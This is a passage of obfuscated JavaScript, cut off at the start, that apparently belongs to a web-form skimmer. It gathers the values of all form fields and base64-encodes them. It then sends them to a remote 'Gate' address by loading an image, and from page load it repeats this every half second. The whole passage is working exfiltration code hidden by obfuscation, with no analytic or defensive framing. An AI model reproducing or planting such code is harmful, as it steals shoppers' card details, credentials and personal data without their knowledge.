_0x28d02a=encodeURIComponent(window.btoa(JSON.stringify(_0x5659ba.Data)));var _0x3667d2=_0x28d02a.hashCode();for(var _0x159bc1=0x0;_0x159bc1<_0x5659ba.Sent.length;_0x159bc1++)if(_0x5659ba.Sent[_0x159bc1]==_0x3667d2)return;_0x5659ba.LoadImage(_0x28d02a);}};_0x5659ba['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x5659ba.SaveAllFields();_0x5659ba.SendData();};_0x5659ba[_0x10a0('0x1b')]=function(_0x4f2a38){_0x5659ba.Sent.push(_0x4f2a38.hashCode());var _0x4af389=document.createElement(_0x10a0('0x1c'));_0x4af389.src=_0x5659ba.GetImageUrl(_0x4f2a38);};_0x5659ba['\x47\x65\x74\x49\x6d\x61\x67\x65\x55\x72\x6c']=function(_0x7e1b65){return _0x5659ba.Gate+_0x10a0('0x1d')+_0x7e1b65;};document[_0x10a0('0x1e')]=function(){if(document[_0x10a0('0x1f')]===_0x10a0('0x20')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0x5659ba[_0x10a0('0x21')],0x1f4);}};